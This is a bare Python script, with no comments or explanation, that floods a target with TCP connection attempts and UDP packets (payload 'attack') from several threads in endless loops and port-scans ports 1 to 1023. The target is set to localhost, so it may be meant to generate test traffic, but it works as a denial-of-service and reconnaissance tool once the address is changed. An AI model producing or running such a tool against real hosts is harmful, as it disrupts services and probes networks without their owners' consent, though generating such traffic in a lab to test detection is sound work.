import socket
import threading
import time
import random

TARGET_IP = "127.0.0.1"
PORTS = [22, 23, 53, 80, 443, 8080]


def tcp_flood():
    while True:
        try:
            port = random.choice(PORTS)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET_IP, port))
            s.close()
        except:
            pass


def udp_flood():
    while True:
        try:
            port = random.choice(PORTS)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"attack", (TARGET_IP, port))
            s.close()
        except:
            pass


def port_scan():
    for port in range(1, 1024):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((TARGET_IP, port))
            s.close()
        except:
            pass


def main():
    threads = []

    for _ in range(5):
        t = threading.Thread(target=tcp_flood)
        t.daemon = True
        t.start()
        threads.append(t)

    for _ in range(3):
        t = threading.Thread(target=udp_flood)
        t.daemon = True
        t.start()
        threads.append(t)

    scan_thread = threading.Thread(target=port_scan)
    scan_thread.start()
    threads.append(scan_thread)

    while True:
        time.sleep(1)


if __name__ == "__main__":
    main()
